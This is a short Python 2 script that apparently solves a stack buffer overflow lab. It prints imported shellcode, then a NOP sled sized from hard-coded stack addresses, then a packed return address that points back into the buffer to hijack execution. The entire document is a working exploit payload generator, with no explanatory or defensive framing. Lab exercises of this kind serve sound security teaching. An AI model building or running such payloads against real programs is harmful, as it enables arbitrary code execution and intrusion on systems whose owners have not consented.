from shellcode import shellcode
from struct import pack
ebp = 0xbffed1b8
buf = 0xbffed14c
shell_addr = 0xbffed14c
# print shellcode + "\x90"*89 + "\x4c\xd1\xfe\xbf"
print shellcode + "\x90"*(ebp - buf + 4 - len(shellcode)) + pack("<I", shell_addr)
